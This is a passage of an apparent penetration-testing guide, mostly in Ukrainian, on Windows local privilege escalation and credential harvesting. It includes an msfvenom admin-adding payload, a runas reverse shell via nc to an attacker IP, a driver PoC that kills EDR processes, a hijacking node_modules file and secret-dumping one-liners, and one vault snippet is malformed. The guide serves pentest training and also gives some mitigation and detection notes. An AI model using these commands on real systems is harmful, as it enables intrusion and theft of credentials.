Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії після збою

Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою service. Цю функцію можна налаштувати так, щоб вона вказувала на binary. Якщо цей binary можна замінити, може бути можливе підвищення привілеїв. Докладнішу інформацію можна знайти в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Застосунки

### Установлені застосунки

Перевірте **дозволи binary** (можливо, один із них можна перезаписати та підвищити привілеї) і **папок** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете ви змінити певний config file, щоб прочитати спеціальний файл, або чи можете змінити binary, який буде виконано обліковим записом Administrator (schedtasks).

Спосіб знайти слабкі дозволи для папок/файлів у системі:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Автозавантаження плагінів Notepad++ для persistence/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з його підпапок `plugins`. Якщо доступна портативна або скопійована інсталяція з можливістю запису, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати певний реєстр або бінарний файл, який буде виконано іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **сторонні підозрілі/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо driver надає довільний примітив читання/запису ядра (поширений випадок у погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM token із пам’яті ядра. Покрокову техніку наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Для race-condition bugs, у яких вразливий виклик відкриває контрольований attacker-ом шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Примітиви пошкодження пам’яті registry hive

Сучасні вразливості hive дають змогу формувати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU і перетворювати пошкодження метаданих на переповнення paged pool ядра без custom driver. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion у direct-mode `RtlQueryRegistryValues` через шляхи, контрольовані attacker-ом

Деякі drivers приймають шлях до registry з userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT` у stack scalar, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу registry, а не до типу, який очікував developer.

Це створює два корисні примітиви:

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу driver-у запитувати вибрані attacker-ом keys, розкривати їх існування через коди повернення/логи, а іноді читати значення, до яких caller не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: destination scalar, наприклад `&readValue`, інтерпретується з неправильним типом як `REG_QWORD`, `UNICODE_STRING` або buffer двійкових даних визначеного розміру залежно від типу registry value.

Практичні примітки щодо exploitation:

- **Захист у Windows 8+**: якщо запит звертається до **untrusted hive** із `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers аварійно завершуються з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість exploitation, шукайте **keys, доступні для запису attacker-у, усередині trusted system hives**, замість розміщення значень у `HKCU`.
- **Staging у trusted hive**: використовуйте NtObjectManager для переліку доступних для запису нащадків `\Registry\Machine`, а потім повторіть сканування з дубльованим **low-integrity** token, щоб знайти keys, доступні із sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує суміжні дані стека та може частково перезаписати розташований поруч callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: прямий режим очікує, що `EntryContext` вказуватиме на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований attacker'ом `REG_DWORD` у scalar на стеку, а потім повторно використовує той самий буфер для читання рядка, attacker контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що призводить до частково контрольованого запису в kernel.
- **`REG_BINARY`**: для великих бінарних даних прямий режим розглядає перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає від'ємне значення, контрольоване attacker'ом, у повторно використаному scalar, наступний запит `REG_BINARY` копіює байти attacker безпосередньо поверх суміжних слотів стека, що часто є найпростішим шляхом до повного перезапису callback pointer.

Надійний патерн для пошуку: **різнорідні читання з реєстру в одну й ту саму змінну стека без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використовувані вказівники `EntryContext` і шляхи виконання, де перше читання з реєстру визначає, чи відбудеться друге читання.

#### Зловживання відсутнім FILE_DEVICE_SECURE_OPEN в об'єктах пристроїв (LPE + EDR kill)

Деякі підписані драйвери сторонніх виробників створюють об'єкт пристрою з сильним SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривається через шлях, що містить додатковий компонент, тому будь-який непривілейований користувач може отримати handle, використовуючи namespace path на кшталт:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Після того як користувач може відкрити пристрій, привілейованими IOCTL, які надає драйвер, можна зловживати для LPE і tampering. Приклади можливостей, що спостерігалися на практиці:
- Повертати handles із повним доступом до довільних процесів (крадіжка token / SYSTEM shell через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене raw disk read/write (offline tampering, persistence tricks під час завантаження).
- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), що дає змогу виконувати AV/EDR kill із user land через kernel.

Мінімальний PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має бути обмежений за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом на завершення процесу або повернення handle.
- Обмежуйте IOCTL (маски доступу, METHOD_*, валідація вхідних даних) і розгляньте brokered models замість прямого доступу до привілеїв ядра.

Detection ideas for defenders
- Відстежуйте відкриття підозрілих імен пристроїв у user-mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що вказують на зловживання.
- Увімкніть Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволів/заборон.

## PATH DLL Hijacking

Якщо у вас є **дозвіл на запис у папку, присутню в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.

Перевірте дозволи для всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв'язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **Windows uncontrolled search path**, який впливає на застосунки **Node.js** та **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може перевіряти:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або каталог пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує розв'язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тому це стає **LPE**, якщо цільовий процес працює від імені адміністратора, із підвищеного scheduled task/service wrapper або як автоматично запущений привілейований desktop app.

Це особливо поширено, коли:

- залежність оголошена в `optionalDependencies`
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує виконання у разі помилки
- пакет було видалено з production builds, пропущено під час пакування або не вдалося встановити
- вразливий `require()` розташований глибоко всередині dependency tree, а не в коді основного застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв'язання:

- Фільтруйте за `Process Name` = цільовий executable (`node.exe`, EXE-файл Electron-застосунку або wrapper process)
- Фільтруйте за `Path` `contains` `node_modules`
- Зосередьтеся на `NAME NOT FOUND` і фінальному успішному відкритті в `C:\node_modules`

Корисні шаблони під час code review у розпакованих `.asar`-файлах або вихідному коді застосунку:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо він ще не існує:
```powershell
mkdir C:\node_modules
```
3. Розмістіть модуль із точно очікуваною назвою:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Запустіть застосунок-жертву. Якщо застосунок намагається виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, які відповідають цьому шаблону, включають `bluebird` і `utf-8-validate`, але **техніка** є універсальною частиною: знайдіть будь-який **відсутній bare import**, який привілейований Windows-процес Node/Electron буде резолвити.

### Ідеї для виявлення та hardening

- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові `.js`-файли/пакети.
- Шукайте процеси з високим рівнем цілісності, які читають із `C:\node_modules\*`.
- Пакуйте всі runtime-залежності у production і перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність тихих шаблонів `try { require("...") } catch {}`.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, деякі розгортання `ws` можуть уникнути застарілої перевірки `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп’ютерів, жорстко заданих у файлі hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте **обмежені служби** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Таблиця ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Перевірте цю сторінку щодо команд, пов’язаних із брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для мережевої розвідки тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти за шляхом `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримали права користувача root, можна прослуховувати будь-який порт (під час першого використання `nc.exe` для прослуховування порту через GUI з’явиться запит, чи слід дозволити `nc` доступ через firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглядати в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Windows

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Менеджер облікових даних / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, у які **Windows** може **автоматично входити від імені користувачів**. Спочатку може здатися, що тепер користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб автоматично входити через браузери. Але це не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в систему від імені користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і Windows Vault та застосовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача та пароль.

Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо ваша програма хоче використовувати vault, вона має певним чином **взаємодіяти з credential manager і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Використовуйте `cmdkey`, щоб переглянути збережені облікові дані на комп’ютері.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Потім ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному нижче прикладі віддалений бінарний файл викликається через SMB-шару.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` із наданими обліковими даними.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або [модуль Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні застосунки Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді всередині Universal Windows Platform (UWP) `PasswordVault` (також доступному як `Web Credentials` у `vaultcmd`). Це сховище ізольоване на рівні сесії, а його вміст можна розшифрувати нативними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активній сесії користувача, щоб миттєво виконати dump і decrypt усіх збережених імен користувачів та паролів у відкритому вигляді:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; v = New-Object Windows.Security.Credentials.PasswordVault; v.RetrieveAll() | ForEach-Object { try { \(_.RetrievePassword();\)_ } catch{} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи для істотного збільшення ентропії.

**DPAPI забезпечує шифрування ключів за допомогою симетричного ключа, похідного від секретів входу користувача**. У сценаріях, що стосуються системного шифрування, використовуються секрети доменної автентифікації системи.

Зашифровані RSA-ключі користувача, зашифровані за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст неможливо переглянути за допомогою команди `dir` у CMD, хоча його можна переглянути через PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **mimikatz module** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.

**Файли облікових даних, захищені головним паролем**, зазвичай розташовані в:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використати **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **видобути багато **masterkeys** DPAPI з **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви маєте права root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовуються для **скриптингу** та завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп’ютері, на якому їх було створено.

Щоб **розшифрувати** облікові дані PS із файлу, який їх містить, можна виконати:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Менеджер облікових даних віддаленого робочого стола**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте модуль `dpapi::rdg` **Mimikatz** із відповідним `/masterkey`, щоб **розшифрувати будь-які .rdg-файли**\
За допомогою модуля `sekurlsa::dpapi` **Mimikatz** можна **витягнути багато головних ключів DPAPI** з пам’яті

### Sticky Notes

Користувачі часто використовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, і його завжди варто пошукати та перевірити.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права Administrator і запустити його з рівнем High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, то, можливо, було налаштовано певні **облікові дані**, які можна **відновити**.

Цей код було взято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та реєстр (облікові дані)

### Облікові дані Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Ключі SSH-хостів PuTTY
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому варто перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис за цим шляхом, найімовірніше, це буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Додаткову інформацію про цю техніку наведено тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, що ця техніка більше не є актуальною. Я спробував створити кілька ssh-ключів, додати їх за допомогою `ssh-add` і виконати вхід через ssh на машину. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичної інсталяції
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM і SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
